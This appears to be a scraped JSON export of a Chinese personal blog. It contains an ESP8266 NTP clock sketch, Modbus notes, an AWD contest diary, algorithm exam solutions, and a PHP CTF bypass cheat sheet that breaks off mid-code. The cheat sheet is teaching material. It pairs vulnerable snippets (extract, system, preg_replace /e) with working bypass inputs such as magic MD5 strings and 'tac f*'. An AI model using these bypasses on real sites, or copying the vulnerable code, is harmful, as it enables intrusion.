Udp.begin(localPort); Serial.print(\u0026#34;Local port: \u0026#34;); Serial.println(Udp.localPort()); Serial.println(\u0026#34;waiting for sync\u0026#34;); setSyncProvider(getNtpTime); setSyncInterval(30); //每300秒同步一次时间  isNTPConnected = true; } time_t prevDisplay = 0; //当时钟已经显示  void loop() { if (timeStatus() != timeNotSet) { if (now() != prevDisplay) { //时间改变时更新显示  prevDisplay = now(); oledClockDisplay(); } } wificonfig.handle(); //若不需要Web后台，可以注释掉此行 } void initdisplay() { u8g2.begin(); u8g2.enableUTF8Print(); } void oledClockDisplay() { int years, months, days, hours, minutes, seconds, weekdays; years = year(); months = month(); days = day(); hours = hour(); minutes = minute(); seconds = second(); weekdays = weekday(); Serial.printf(\u0026#34;%d/%d/%d %d:%d:%d Weekday:%d\\n\u0026#34;, years, months, days, hours, minutes, seconds, weekdays); u8g2.clearBuffer(); u8g2.setFont(u8g2_font_unifont_t_chinese2); u8g2.setCursor(0, 14); if (isNTPConnected) u8g2.print(\u0026#34;当前时间 (UTC+8)\u0026#34;); else u8g2.print(\u0026#34;无网络!\u0026#34;); //如果上次对时失败，则会显示无网络  String currentTime = \u0026#34;\u0026#34;; if (hours \u0026lt; 10) currentTime += 0; currentTime += hours; currentTime += \u0026#34;:\u0026#34;; if (minutes \u0026lt; 10) currentTime += 0; currentTime += minutes; currentTime += \u0026#34;:\u0026#34;; if (seconds \u0026lt; 10) currentTime += 0; currentTime += seconds; String currentDay = \u0026#34;\u0026#34;; currentDay += years; currentDay += \u0026#34;/\u0026#34;; if (months \u0026lt; 10) currentDay += 0; currentDay += months; currentDay += \u0026#34;/\u0026#34;; if (days \u0026lt; 10) currentDay += 0; currentDay += days; u8g2.setFont(u8g2_font_logisoso24_tr); u8g2.setCursor(0, 44); u8g2.print(currentTime); u8g2.setCursor(0, 61); u8g2.setFont(u8g2_font_unifont_t_chinese2); u8g2.print(currentDay); u8g2.drawXBM(80, 48, 16, 16, xing); u8g2.setCursor(95, 62); u8g2.print(\u0026#34;期\u0026#34;); if (weekdays == 1) u8g2.print(\u0026#34;日\u0026#34;); else if (weekdays == 2) u8g2.print(\u0026#34;一\u0026#34;); else if (weekdays == 3) u8g2.print(\u0026#34;二\u0026#34;); else if (weekdays == 4) u8g2.print(\u0026#34;三\u0026#34;); else if (weekdays == 5) u8g2.print(\u0026#34;四\u0026#34;); else if (weekdays == 6) u8g2.print(\u0026#34;五\u0026#34;); else if (weekdays == 7) u8g2.drawXBM(111, 49, 16, 16, liu); u8g2.sendBuffer(); } /*-------- NTP 代码 ----------*/ const int NTP_PACKET_SIZE = 48; // NTP时间在消息的前48个字节里 byte packetBuffer[NTP_PACKET_SIZE]; // 输入输出包的缓冲区  time_t getNtpTime() { IPAddress ntpServerIP; // NTP服务器的地址  while (Udp.parsePacket() \u0026gt; 0); // 丢弃以前接收的任何数据包  Serial.println(\u0026#34;Transmit NTP Request\u0026#34;); // 从池中获取随机服务器  WiFi.hostByName(ntpServerName, ntpServerIP); Serial.print(ntpServerName); Serial.print(\u0026#34;: \u0026#34;); Serial.println(ntpServerIP); sendNTPpacket(ntpServerIP); uint32_t beginWait = millis(); while (millis() - beginWait \u0026lt; 1500) { int size = Udp.parsePacket(); if (size \u0026gt;= NTP_PACKET_SIZE) { Serial.println(\u0026#34;Receive NTP Response\u0026#34;); isNTPConnected = true; Udp.read(packetBuffer, NTP_PACKET_SIZE); // 将数据包读取到缓冲区  unsigned long secsSince1900; // 将从位置40开始的四个字节转换为长整型，只取前32位整数部分  secsSince1900 = (unsigned long)packetBuffer[40] \u0026lt;\u0026lt; 24; secsSince1900 |= (unsigned long)packetBuffer[41] \u0026lt;\u0026lt; 16; secsSince1900 |= (unsigned long)packetBuffer[42] \u0026lt;\u0026lt; 8; secsSince1900 |= (unsigned long)packetBuffer[43]; Serial.println(secsSince1900); Serial.println(secsSince1900 - 2208988800UL + timeZone * SECS_PER_HOUR); return secsSince1900 - 2208988800UL + timeZone * SECS_PER_HOUR; } } Serial.println(\u0026#34;No NTP Response :-(\u0026#34;); //无NTP响应  isNTPConnected = false; return 0; //如果未得到时间则返回0 } // 向给定地址的时间服务器发送NTP请求 void sendNTPpacket(IPAddress\u0026amp; address) { memset(packetBuffer, 0, NTP_PACKET_SIZE); packetBuffer[0] = 0b11100011; // LI, Version, Mode  packetBuffer[1] = 0; // Stratum, or type of clock  packetBuffer[2] = 6; // Polling Interval  packetBuffer[3] = 0xEC; // Peer Clock Precision  // 8 bytes of zero for Root Delay \u0026amp; Root Dispersion  packetBuffer[12] = 49; packetBuffer[13] = 0x4E; packetBuffer[14] = 49; packetBuffer[15] = 52; Udp.beginPacket(address, 123); //NTP需要使用的UDP端口号为123  Udp.write(packetBuffer, NTP_PACKET_SIZE); Udp.endPacket(); }   ","description":"","id":17,"section":"posts","tags":["嵌入式","esp8266"],"title":"esp8266整点活","uri":"https://ruokeqx.gitee.io/posts/esp8266%E6%95%B4%E7%82%B9%E6%B4%BB/"},{"content":"国赛决赛的modbus流量至今没接出来，学习一下通信基础，爬爬爬。\n数字通信方式 按传送方式分类  并行  按字或字节为单位传输，n位必须要n根线，传输速度快，通信线多，成本高。多用于计算机和PLC内部总线，如显卡数据。   串行  以bit为单位，每次传1bit，传输距离远。    按传送方向分类  单工  一方只能接收不能发出：打印机   半双工  一根线传输，同时只有一方发出：对讲机   双工  两根线传输，双方可同时发出    按通信介质分类  双绞线 同轴电缆 光纤  通信协议三要素 通信接口标准 通信接口标准是通信的硬件协议，提供了机械的电气的功能性的特性和规程。\n串行数据接口标准，最常见的是RS232、RS422、RS485串行接口标准\n通信格式 穿行异步通信中，通信双方必须就通信数据传送方式，传送的数据长度，校验方式和传输速率进行统一设置，这样才能保证双方通信的正确。这种双方统一设置的参数，称之为通信格式。\n通信数据格式 信息传输内容做出规定，如信息帧的结构，设备的站址，功能代码，发送的数据校验方式，错误检测。\n通信接口标准 RS232 RS485 首选的串行接口。\nRS485接口组成的半双工网络，一般只需二根连线，成本低，易实现。再分布式工业控制系统种广泛应用。\n终端电阻\n100欧\n末端\n通信格式与数据格式 串行异步通信传送  如何知道开始传送 结束传送 发送的字符位数 如何知道接受的字符没错  modbus协议 基于RS485，主从式的串行异步半双工通信协议。\nascii模式    数据 位数     起始位： 1位   数据长度： 7位，低位先   校验位： 1（有校验），0（无）   停止位： 1（有校验），2（无）   波特率： 可选       起始码 地址码 功能码 数据区 校验码 停止码     : 01-1F 功能码 n个字符 LRC CR | LF   : 01 03 21 02 00 02 LRC CR | LF    LRC校验码：从地址码到数据区的2位HEX求和，取和的低8位的补码为LRC校验码。\nRTU模式    数据 位数     起始位： 1位   数据长度： 8位，低位先   校验位： 1（有校验），0（无）   停止位： 1（有校验），2（无）   波特率： 可选       起始码 地址码 功能码 数据区 校验码 停止码     3.5字符停止时间 01-1F 功能码 n个字符 CRC 3.5字符停止时间   3.5字符停止时间 01 03 21 02 00 02 CRC 3.5字符停止时间   3.5字符停止时间 01 83 错误代码 CRC 3.5字符停止时间    发送帧信息期间，出现大于1.5个字符的\t静止时间，则信息会出现错误。\n错误应答    功能码 正确应答 错误应答     H03(0000 0011) H03 H83(1000 0011)   H06 H06 H86   H10 H10 H90    ","description":"","id":18,"section":"posts","tags":["通信"],"title":"通信入门以modbus通信协议为例","uri":"https://ruokeqx.gitee.io/posts/%E9%80%9A%E4%BF%A1%E5%85%A5%E9%97%A8%E4%BB%A5modbus%E9%80%9A%E4%BF%A1%E5%8D%8F%E8%AE%AE%E4%B8%BA%E4%BE%8B/"},{"content":"我是懒狗无疑了 一个博客都能托两天不做\n怎么说呢，人生第一次AWD来的有点突然 。刚好在看手机，观花姐姐在群里说了声AWD报名，我就抱着试试看的态度就参加了。\n《本篇博客纯属想到啥说啥》\n赛前 赛前并没用做什么事情，有师傅发了一下比赛规则，当时粗略的看了一下，但是对于最后一句冗长的话似懂非懂地掠过了。\n赛时 比赛开始，群里师傅很快就把网站备份给发了上来(师傅们tql)。\n然而此时的我还看着平台的界面在准备连ssh。\n但是神奇的是我ssh一直连不上去，自闭了好一会，浪费了挺多时间的。后来去群里问了才知道是师傅把ssh密码给改了。\n这时候师傅们已经不断地发他们发现的漏洞了。\n稍微研究了一下究竟要干嘛，知道Targets里面都是端口，是我们要攻击的对象，我们ssh连上的自己的服务器，所有队伍的内容都是一样的，我们要进行防守，防止对方夺取flag。\n这个时候师傅已经在群里发一大串一大串的flag了，这些都是因为平台卡或者是脚本提交失败而没交上去的。反正什么也不会，我就充当了人肉交flag的角色。\n师傅们都是直接拿脚本批量攻击拿flag的tql。\n比赛也不乏有趣的事情发生，有个队伍就放出了 StopAttack ，或许能让紧张比赛的师傅心情突然变好吧，hhh。\n在自己服务器下浏览许久发现似乎除了 /var/www/html 里面是主站 别的什么都没有\n每个站都有个专门的流量文件，可以看到所有的访问流量，在里面可以看到很多的恶意攻击。我想我们攻击的时候应该可以借鉴一下其他攻击者的攻击方式，从而进行攻击。\n比赛接近尾声，我在看某个文件上传的点的时候想到己方的服务器可能被对方上了🐎，看了一下果然是。\n这时候产生了一个想法，我们可以写一个脚本来监控这个地址，只要有文件传上来就立刻删掉。\n正在我准备删掉这个的时候，下一秒，另一个师傅就发现我们被删站了。。。。。\n再然后，比赛就结束了。\n赛后 比赛结束有师傅直接在比赛大群里发获取的一大串ssh密码，并直接上号删站的操作。 （我京了！）\n后来去群里问自己师傅是不是一开始直接改ssh密码可以避免这种事情发生，被师傅批评说没看比赛说明了。（但是想了想，无论如何，改ssh密码确实是可以即便在cookie泄露的情况下也能防止被删站/被登录的手段，或许以后可以借鉴一下，养成改密码的习惯，说好听点叫安全意识吧）\n再看了一眼注意事项，突然吓到了自己。。。。\n（虽然我只在同一个浏览器里看了一个对面的web3 但是确实有可能是我泄露了cookie）\n这是产生泄露的原因(后来在星盟某个直播中看到的挺好的就截下图了)\n害，是真的没有想到居然还有这种骚操作，真的是学习的路还很长啊。\n总结 总结了一下\nAWD的特点是主要漏洞可能没有平常解题类题目的难度大\n主要是发现漏洞和修复漏洞的能力，审计流量的能力，攻击的能力以及反应速度等等\n当然了 利用CVE的是更高一层次的境界了。（我tcl）\n无论如何，脚本是一直围绕AWD的重点，所以确定了一下接下来的学习目标：增加脚本的编写能力。\n","description":"","id":19,"section":"posts","tags":["CTF","AWD"],"title":"记人生第一次AWD","uri":"https://ruokeqx.gitee.io/posts/my_first_awd/"},{"content":"总结：学过算法的可以水学分 没学过的不太好水高分 一般c语言学了70-80分没问题 但是90-100有难度 自行斟酌\n问题 A: 赌徒 题目描述 有n个赌徒打算赌一局。规则是：\n每人下一个赌注，赌注为非负整数，且任意两个赌注都不相同。胜者为赌注恰好是其余任意三个人的赌注之和的那个人。如果有多个胜者，我们取赌注最大的那个为最终胜者。\n例如，A，B，C，D，E分别下赌注为2、3、5、7、12，最终胜者是E，因为12=2+3+7。\n输入 输入包含多组测试数据。每组首先输入一个整数n（1\u0026lt;=n\u0026lt;=1000），表示赌徒的个数。\n接下来n行每行输入一个非负整数b（0\u0026lt;=b\u0026lt;32768），表示每个赌徒下的赌注。\n当n=0时，输入结束。\n输出 对于每组输入，输出最终胜者的赌注，如果没有胜者，则输出no solution。\n简单思路 直接暴力 但是我总觉得数据稍微大点这题绝对不能这么做\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39  #include\u0026lt;iostream\u0026gt;#include\u0026lt;cstdio\u0026gt;#include\u0026lt;cmath\u0026gt;#include\u0026lt;queue\u0026gt;#include\u0026lt;cstring\u0026gt;#include\u0026lt;algorithm\u0026gt;using namespace std; bool cmp(int a,int b){ return a\u0026gt;b; } int main(){ int n; int a[1111]; while(cin\u0026gt;\u0026gt;n \u0026amp;\u0026amp; n){ for(int i=1;i\u0026lt;=n;i++) cin\u0026gt;\u0026gt;a[i]; sort(a+1,a+1+n,cmp); int flag=0; for(int t=1;t\u0026lt;=n;t++){ for(int i=t+1;i\u0026lt;=n;i++){ for(int j=i+1;j\u0026lt;=n;j++){ for(int k=j+1;k\u0026lt;=n;k++){ if(a[i]+a[j]+a[k]==a[t]){ cout\u0026lt;\u0026lt;a[t]\u0026lt;\u0026lt;endl; flag=1; break; } } if(flag) break; } if(flag) break; } if(flag) break; } if(!flag) cout\u0026lt;\u0026lt;\u0026#34;no solution\\n\u0026#34;; } return 0; }   问题 B: ASCII码 题目描述 相信大家一定都知道大名鼎鼎的ASCII码，这次给你的任务是输入数字（表示ASCII码），输出相对应的字符信息。\n输入 第一行为一个整数T（1\u0026lt;=T\u0026lt;=1000）。\n接下来包括T个正整数，由空白符分割。（空白符包括空格、换行、制表符）\n这些整数不会小于32。\n输出 在一行内输出相应的字符信息。（注意不要输出任何多余的字符）\n简单思路 直接强转就行了\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20  #include\u0026lt;iostream\u0026gt;#include\u0026lt;cstdio\u0026gt;#include\u0026lt;cmath\u0026gt;#include\u0026lt;queue\u0026gt;#include\u0026lt;cstring\u0026gt;#include\u0026lt;algorithm\u0026gt;using namespace std; int main(){ int t; while(cin\u0026gt;\u0026gt;t){ while(t--){ int a; cin\u0026gt;\u0026gt;a; cout\u0026lt;\u0026lt;(char)a; } cout\u0026lt;\u0026lt;endl; } system(\u0026#34;pause\u0026#34;); return 0; }   问题 C: 期末成绩 题目描述 又到学期末，小明迎来了又一次的期末考试。虽然每学期都要考试，但是这次期末考试对小明来说意义重大。因为小明爱慕已久的女神说，如果小明这次考了全班前三名就做他女朋友。虽说小明没有十足的信心，但是女神的话不能不听啊。\n考完试后，小明拿到了全班的成绩单，这张成绩单是按学号顺序排好的。小明很想知道班里到底有多少人分数比他高，现在就请你帮帮他，帮他数一下到底有多少人的分数比他高吧。\n输入 输入数据的第一行是一个正整数T，表示测试数据的组数，接下来有T组测试数据。\n每组数据包括两行。\n第一行有两个正整数N，K（0\u0026lt;N\u0026lt;1000，0\u0026lt;K\u0026lt;=N）,分别表示成绩单上总共的学生数目，和小明的学号。\n第二行有N个整数Xi（0\u0026lt;=Xi\u0026lt;=100）分别表示各个学生的成绩，以学号递增顺序给出，第一个学生学号为1。\n输出 对于每组数据，请在一行里输出班里一共有多少个学生成绩高于小明。\n样例输入 1\n3 2\n81 72 63\n样例输出 1\n简单思路 for历遍一下就可以\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27  #include\u0026lt;iostream\u0026gt;#include\u0026lt;cstdio\u0026gt;#include\u0026lt;cmath\u0026gt;#include\u0026lt;queue\u0026gt;#include\u0026lt;cstring\u0026gt;#include\u0026lt;algorithm\u0026gt;using namespace std; int main(){ int t; int n,k; while(cin\u0026gt;\u0026gt;t){ while(t--){ int a[2000]={0}; memset(a,0,sizeof(a)); cin\u0026gt;\u0026gt;n\u0026gt;\u0026gt;k; for(int i=1;i\u0026lt;=n;i++) cin\u0026gt;\u0026gt;a[i]; int t=a[k]; int count=0; for(int i=1;i\u0026lt;=n;i++) if(a[i]\u0026gt;t) count++; cout\u0026lt;\u0026lt;count\u0026lt;\u0026lt;endl; } } return 0; }   问题 D: 【基础题】尽可能大的三位数 题目描述 输入一个三位数的正整数，将数字位置重新排列，组成一个尽可大的三位数。例如：输入213，重新排列可得到尽可能大的三位数是321。\n输入 三位数的正整数。\n输出 重排后尽可能大的三位数。\n样例输入 213\n样例输出 321\n简单思路 sort一下就行\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19  #include\u0026lt;iostream\u0026gt;#include\u0026lt;cstdio\u0026gt;#include\u0026lt;cmath\u0026gt;#include\u0026lt;queue\u0026gt;#include\u0026lt;cstring\u0026gt;#include\u0026lt;algorithm\u0026gt;#include\u0026lt;set\u0026gt;using namespace std; bool cmp(char a,char b){ return a\u0026gt;b; } int main(){ char a[10]; while(cin\u0026gt;\u0026gt;a[0]\u0026gt;\u0026gt;a[1]\u0026gt;\u0026gt;a[2]){ sort(a,a+3,cmp); cout\u0026lt;\u0026lt;a[0]\u0026lt;\u0026lt;a[1]\u0026lt;\u0026lt;a[2]\u0026lt;\u0026lt;endl; } return 0; }   问题 E: 会场安排问题 题目描述 假设要在足够多的会场里安排一批活动，并希望使用尽可能少的会场。设计一个有效的\n贪心算法进行安排。(这个问题实际上是著名的图着色问题。若将每一个活动作为图的一个\n顶点，不相容活动间用边相连。使相邻顶点着有不同颜色的最小着色数，相应于要找的最小\n会场数。)\n编程任务： 对于给定的 k 个待安排的活动，编程计算使用最少会场的时间表。\n输入 第一行有 1 个正整数 k，表示有 k 个待安排的活动。接\n下来的 k 行中，每行有 2 个正整数，分别表示 k 个待安排的活动开始时间和结束时间。时间\n以 0 点开始的分钟计。\n输出 将编程计算出的最少会场数输出\n样例输入 5 1 23 12 28 25 35 27 80 36 50\n样例输出 3\n提示 k\u0026lt;10000\n简单思路 begin排序 end小了就开一个会场\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23  #include\u0026lt;iostream\u0026gt;#include\u0026lt;cstdio\u0026gt;#include\u0026lt;cmath\u0026gt;#include\u0026lt;queue\u0026gt;#include\u0026lt;cstring\u0026gt;#include\u0026lt;algorithm\u0026gt;using namespace std; int s[11111],e[11111]; int main(){ int n=0,i=0,j=0,k=0; cin\u0026gt;\u0026gt;n; for(;i\u0026lt;n;i++) cin\u0026gt;\u0026gt;s[i]\u0026gt;\u0026gt;e[i]; sort(s,s+n); sort(e,e+n); for(i=0;i\u0026lt;n;i++) { if(s[i]\u0026lt;e[j]) k++; else j++; } cout\u0026lt;\u0026lt;k\u0026lt;\u0026lt;endl; system(\u0026#34;pause\u0026#34;); return 0; }   问题 F: 飞翔 题目描述 鹰最骄傲的就是翱翔，但是鹰们互相都很嫉妒别的鹰比自己飞的快，更嫉妒其他的鹰比自己飞行的有技巧。于是，他们决定举办一场比赛，比赛的地方将在一个迷宫之中。\n这些鹰的起始点被设在一个N*M矩阵的左下角map[1，1]的左下角。终点被设定在矩阵的右上角map[N,M]的右上角，有些map[i,j]是可以从中间穿越的。每一个方格的边长都是100米。如图所示：\n没有障碍，也没有死路。这样设计主要是为了高速飞行的鹰们不要发现死路来不及调整而发生意外。潘帕斯雄鹰冒着减RP的危险从比赛承办方戒备森严的基地中偷 来了施工的地图。但是问题也随之而来，他必须在比赛开始之前把地图的每一条路都搞清楚，从中找到一条到达终点最近的路。（哈哈，笨鸟不先飞也要拿冠军）但 是此鹰是前无古鹰，后无来鹰的吃菜长大的鹰\u0026ndash;菜鸟。他自己没有办法得出最短的路径，于是紧急之下找到了学OI的你，希望找到你的帮助。\n输入 首行为n,m(0\u0026lt;n,m\u0026lt;=1000000),第2行为k（0\u0026lt;k\u0026lt;=1000）表示有多少个特殊的边。以下k行为两个数，i,j表示map[i,j]是可以直接穿越的。\n输出 仅一行，1，1\u0026ndash;\u0026gt;n,m的最短路径的长度，四舍五入保留到整数即可\n样例输入 3 2\n3\n1 1\n3 2\n1 2\n样例输出 383\n简单思路 找最长上升的数量 即走斜线的数量\n然后就是找上升个数和长度的规律(其实一目了然) 4舍5入\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39  //n,m小的话可以dfs 但是这个太大了。。。 //其实算出上升数量就行了 #include\u0026lt;iostream\u0026gt;#include\u0026lt;cstdio\u0026gt;#include\u0026lt;cmath\u0026gt;#include\u0026lt;queue\u0026gt;#include\u0026lt;cstring\u0026gt;#include\u0026lt;algorithm\u0026gt;using namespace std; struct N{ int x; int y; }; N node[1111]; int dp[1111]; bool cmp(N a, N b){ return a.x\u0026lt;b.x; } int main(){ int n,m,k; while(cin\u0026gt;\u0026gt;n\u0026gt;\u0026gt;m\u0026gt;\u0026gt;k){ memset(dp,0,sizeof(dp)); for(int i=0;i\u0026lt;k;i++) cin\u0026gt;\u0026gt;node[i].x\u0026gt;\u0026gt;node[i].y; sort(node,node+k,cmp); int maxn = 0; for(int i=0;i\u0026lt;k;i++){ dp[i]=1; for(int j=0;j\u0026lt;i;j++) if(node[i].x \u0026gt; node[j].x \u0026amp;\u0026amp; node[i].y \u0026gt; node[j].y \u0026amp;\u0026amp; dp[i] \u0026lt; dp[j]+1) dp[i] = dp[j]+1; if(dp[i] \u0026gt; maxn) maxn = dp[i]; } double t=100.0*(n+m-2*maxn)+sqrt(2)*100.0*maxn; cout\u0026lt;\u0026lt;(int)(t+0.5)\u0026lt;\u0026lt;endl; } return 0; }   ","description":"","id":20,"section":"posts","tags":["课程"],"title":"2020浙江理工大学算法艺术与信息学奥赛选修课期末考试","uri":"https://ruokeqx.gitee.io/posts/2020_zstu_algorithm_optional_class/"},{"content":"%0a绕过 1 2 3 4 5 6  if($_GET[\u0026#39;num\u0026#39;] !== \u0026#39;23333\u0026#39; \u0026amp;\u0026amp; preg_match(\u0026#39;/^23333$/\u0026#39;, $_GET[\u0026#39;num\u0026#39;])){ echo \u0026#39;1st ok\u0026#39;.\u0026#34;\u0026lt;br\u0026gt;\u0026#34;; } else{ die(\u0026#39;23333333\u0026#39;); }   %0A绕过(%0A经URL编码后是回车)\ntac 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22  $query = $_SERVER[\u0026#39;QUERY_STRING\u0026#39;]; if (strlen($cmd) \u0026gt; 8){ die(\u0026#34;too long :(\u0026#34;); } if( substr_count($query, \u0026#39;_\u0026#39;) === 0 \u0026amp;\u0026amp; substr_count($query, \u0026#39;%5f\u0026#39;) === 0 ){ $arr = explode(\u0026#39; \u0026#39;, $cmd); if($arr[0] !== \u0026#39;ls\u0026#39; || $arr[0] !== \u0026#39;pwd\u0026#39;){ if(substr_count($cmd, \u0026#39;cat\u0026#39;) === 0){ system($cmd); } else{ die(\u0026#39;ban cat :) \u0026#39;); } } else{ die(\u0026#39;bad guy!\u0026#39;); } } else{ die(\u0026#39;nonono _ is bad\u0026#39;); }   禁用cat ls pwd\nsystem(tac f*)\nlinux tac命令\n这里相当于system(tac f*)\n此题system(tac fl*)也可以\nMD5绕过 0e绕过 练习地址\nhttp://chinalover.sinaapp.com/web17/index.php?a=s1885207154a\u0026amp;b=s1836677006a\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16  \u0026lt;?php if (isset($_GET[\u0026#39;a\u0026#39;]) \u0026amp;\u0026amp; isset($_GET[\u0026#39;b\u0026#39;])) { $a = $_GET[\u0026#39;a\u0026#39;]; $b = $_GET[\u0026#39;b\u0026#39;]; if ($a != $b \u0026amp;\u0026amp; md5($a) == md5($b)) { echo \u0026#34;flag{XXXXX}\u0026#34;; } else { echo \u0026#34;wrong!\u0026#34;; } } else { echo \u0026#39;wrong!\u0026#39;; } ?\u0026gt;  上面只要传入参数a=s1885207154a，b=s1836677006a，即可，为什么呢？看一下这两个字符串的md5值可以返现分别如下：\n1 2 3  MD5值 md5(\u0026#34;s1885207154a\u0026#34;) =\u0026gt; 0e509367213418206700842008763514 md5(\u0026#34;s1836677006a\u0026#34;) =\u0026gt; 0e481036490867661113260034900752   二者都是0e开头，在php中0e会被当做科学计数法，就算后面有字母，其结果也是0，所以上面的if判断结果使true，成功绕过\npreg_replace函数 题目(xctf ics-05)(攻防世界有复现)\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18  \u0026lt;?php //方便的实现输入输出的功能,正在开发中的功能，只能内部人员测试 if ($_SERVER[\u0026#39;HTTP_X_FORWARDED_FOR\u0026#39;] === \u0026#39;127.0.0.1\u0026#39;) { echo \u0026#34;\u0026lt;br \u0026gt;Welcome My Admin ! \u0026lt;br \u0026gt;\u0026#34;; $pattern = $_GET[pat]; $replacement = $_GET[rep]; $subject = $_GET[sub]; if (isset($pattern) \u0026amp;\u0026amp; isset($replacement) \u0026amp;\u0026amp; isset($subject)) { preg_replace($pattern, $replacement, $subject); }else{ die(); } } ?\u0026gt;  函数作用：搜索subject中匹配pattern的部分， 以replacement进行替换。\r$pattern: 要搜索的模式，可以是字符串或一个字符串数组。\r$replacement: 用于替换的字符串或字符串数组。\r$subject: 要搜索替换的目标字符串或字符串数组。\rpreg_replace函数存在命令执行漏洞\r 此处明显考察的是preg_replace 函数使用 /e模式，导致代码执行的问题。\n参考[https://www.cnblogs.com/dhsx/p/4991983.html]\n/e 修正符使 preg_replace() 将 replacement 参数当作 PHP 代码（在适当的逆向引用替换完之后）。提示：要确保 replacement 构成一个合法的 PHP 代码字符串，否则 PHP 会在报告在包含 preg_replace() 的行中出现语法解析错误。\n也就是说，pat和sub有相同部分，rep的代码就会执行。\n根据源码分析X-Forwarded-For改成127.0.0.1之后，GET进三个参数。然后调用了preg_replace函数。并且没有对pat进行过滤，所以可以传入\u0026quot;/e\u0026quot;触发漏洞\n最终结果\nextract变量覆盖 1 2 3 4 5 6 7 8 9 10 11  \u0026lt;?php $flag=\u0026#39;xxx\u0026#39;; extract($_GET); if(isset($shiyan)){ $content=trim(file_get_contents($flag)); if($shiyan==$content){ echo\u0026#39;flag{xxx}\u0026#39;; }else{ echo\u0026#39;Oh.no\u0026#39;; } }   代码大概的意思是可以从get获得的参数，设置入GET超全局数组里面，并且覆盖之前的变量\n这样子只需要重新设置$shiyan 和 $content，绕过if的检测就可以了\nstrcmp比较字符串 1 2 3 4 5 6 7 8 9  \u0026lt;?php $flag = \u0026#34;flag{xxxxx}\u0026#34;; if (isset($_GET[\u0026#39;a\u0026#39;])) { if (strcmp($_GET[\u0026#39;a\u0026#39;], $flag) == 0) //如果 str1 小于 str2 返回 \u0026lt; 0； 如果 str1大于 str2返回 \u0026gt; 0；如果两者相等，返回 0。 \t//比较两个字符串（区分大小写） \tdie(\u0026#39;Flag: \u0026#39;.$flag); else print \u0026#39;No\u0026#39;; }   传数组\nurl二次编码绕过 1 2 3 4 5 6 7 8 9 10  \u0026lt;?php if(eregi(\u0026#34;hackerDJ\u0026#34;,$_GET[id])) { echo(\u0026#34;not allowed!\u0026#34;); exit(); } $_GET[id] = urldecode($_GET[id]); if($_GET[id] == \u0026#34;hackerDJ\u0026#34;){ echo \u0026#34;Access granted!\u0026#34;; echo \u0026#34;flag\u0026#34;; }    ergei()\t函数正则匹配 等于erge()函数 只是匹配的时候忽略大小写  需要匹配 hackerDJ 只要在他url编码后任意一个编码前加上25就行 %25 url解码后是 %\nmd5函数 1 2 3 4 5 6 7 8 9 10 11  \u0026lt;?php error_reporting(0); $flag = \u0026#39;flag{test}\u0026#39;; if (isset($_GET[\u0026#39;username\u0026#39;]) and isset($_GET[\u0026#39;password\u0026#39;])) { if ($_GET[\u0026#39;username\u0026#39;] == $_GET[\u0026#39;password\u0026#39;]) print \u0026#39;Your password can not be your username.\u0026#39;; else if (md5($_GET[\u0026#39;username\u0026#39;]) === md5($_GET[\u0026#39;password\u0026#39;])) die(\u0026#39;Flag: \u0026#39;.$flag); else print \u0026#39;Invalid password\u0026#39;; }   0e绕过好像没用 直接数组绕过\n数组返回NULL绕过 1 2 3 4 5 6 7 8 9 10  \u0026lt;?php $flag = \u0026#34;flag\u0026#34;; if (isset ($_GET[\u0026#39;password\u0026#39;])) { if (ereg (\u0026#34;^[a-zA-Z0-9]+$\u0026#34;, $_GET[\u0026#39;password\u0026#39;]) === FALSE) echo \u0026#39;You password must be alphanumeric\u0026#39;; else if (strpos ($_GET[\u0026#39;password\u0026#39;], \u0026#39;--\u0026#39;) !== FALSE) die(\u0026#39;Flag: \u0026#39; . $flag); else echo \u0026#39;Invalid password\u0026#39;; }   弱类型整数大小比较绕过 1 2 3 4 5  \u0026lt;?php $temp = $_GET[\u0026#39;password\u0026#39;]; is_numeric($temp)?die(\u0026#34;no numeric\u0026#34;):NULL; if($temp\u0026gt;1336) echo $flag;   科学计数法 也可以传数组\nsha()函数比较绕过 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17  \u0026lt;?php $flag = \u0026#34;flag\u0026#34;; if (isset($_GET[\u0026#39;name\u0026#39;]) and isset($_GET[\u0026#39;password\u0026#39;])){ var_dump($_GET[\u0026#39;name\u0026#39;]); echo \u0026#34;\u0026#34;; var_dump($_GET[\u0026#39;password\u0026#39;]); var_dump(sha1($_GET[\u0026#39;name\u0026#39;])); var_dump(sha1($_GET[\u0026#39;password\u0026#39;])); if ($_GET[\u0026#39;name\u0026#39;] == $_GET[\u0026#39;password\u0026#39;]) echo \u0026#39;Your password can not be your name!\u0026#39;; else if (sha1($_GET[\u0026#39;name\u0026#39;]) === sha1($_GET[\u0026#39;password\u0026#39;])) die(\u0026#39;Flag: \u0026#39;.$flag); else echo \u0026#39;Invalid password.\u0026#39;; }else{ echo \u0026#39;Login first!\u0026#39;; }    var_dump()\t打印变量相关信息 sha1()\t计算字符串的 sha1 散列值  数组绕过\nmd5加密相等绕过 1 2 3 4 5 6 7 8 9 10 11 12 13  \u0026lt;?php $md51 = md5(\u0026#39;QNKCDZO\u0026#39;); $a = @$_GET[\u0026#39;a\u0026#39;]; $md52 = @md5($a); if(isset($a)){ if ($a != \u0026#39;QNKCDZO\u0026#39; \u0026amp;\u0026amp; $md51 == $md52) { echo \u0026#34;flag{*}\u0026#34;; } else { echo \u0026#34;false!!!\u0026#34;; } }else{ echo \u0026#34;please input a\u0026#34;; }   虽然说不用看也知道一定是0e绕过。。。。\n十六进制与数字比较 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22  \u0026lt;?php error_reporting(0); function noother_says_correct($temp) { $flag = \u0026#39;flag{test}\u0026#39;; $one = ord(\u0026#39;1\u0026#39;); //ord — 返回字符的 ASCII 码值 \t$nine = 